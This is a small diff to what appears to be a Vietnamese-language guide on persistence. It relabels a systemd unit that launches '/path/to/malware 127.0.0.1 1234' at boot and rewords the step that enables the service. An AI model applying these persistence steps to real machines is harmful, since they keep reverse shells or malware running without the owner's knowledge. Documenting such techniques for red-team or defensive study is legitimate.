@@ -82,7 +82,7 @@ crontab -e
   
   ```
   [Unit]
-  Description=Reverse Shell
+  Description=Malware
   
   [Service]
   ExecStart=/path/to/malware 127.0.0.1 1234
@@ -92,7 +92,7 @@ crontab -e
   WantedBy=default.target
   ```
 
-  - Khởi động lại systemd:
+  - Enable và start service:
  
   ```
   sudo systemctl enable malware.service
